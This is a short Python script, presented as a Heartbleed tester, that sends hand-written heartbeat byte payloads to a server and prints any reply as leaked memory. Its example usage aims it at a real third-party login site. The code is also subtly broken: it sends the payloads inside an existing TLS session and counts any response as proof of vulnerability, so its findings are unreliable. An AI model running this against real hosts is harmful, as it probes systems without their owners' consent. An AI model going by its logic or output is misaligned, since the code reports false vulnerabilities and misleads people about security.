import socket
import ssl

def test_heartbleed(host, port):
    try:
        # Resolve the hostname to an IP address
        ip_address = socket.gethostbyname(host)

        # Connect to the server using SSL
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
        conn.connect((host, port))

        # Define multiple payloads to test for Heartbleed
        payloads = [
            b'\x18\x03\x02\x00\x03\x01\x40\x00',  # Original Heartbleed payload
            b'\x18\x03\x03\x00\x03\x01\x40\x00',  # Another Heartbleed payload variation
            # Add more payloads if desired
        ]

        # Iterate over each payload and test for Heartbleed
        for i, payload in enumerate(payloads):
            conn.send(payload)

            # Receive the response
            response = conn.recv(4096)

            # Check if the response contains any data (indicating server is vulnerable)
            if response:
                print(f"Payload {i+1}: {host}:{port} is potentially vulnerable to Heartbleed")
                print("Response data:")
                print(bytes.fromhex(response.hex()).decode())  # Convert and display response data
            else:
                print(f"Payload {i+1}: {host}:{port} is not vulnerable to Heartbleed")

    except (socket.error, ssl.SSLError) as e:
        print(f"Error: {e}")

    finally:
        # Close the connection
        conn.close()

# Example usage
if __name__ == "__main__":
    website = "login.yahoo.com"  # Change this to the website you want to test
    port = 443  # Default HTTPS port

    test_heartbleed(website, port)
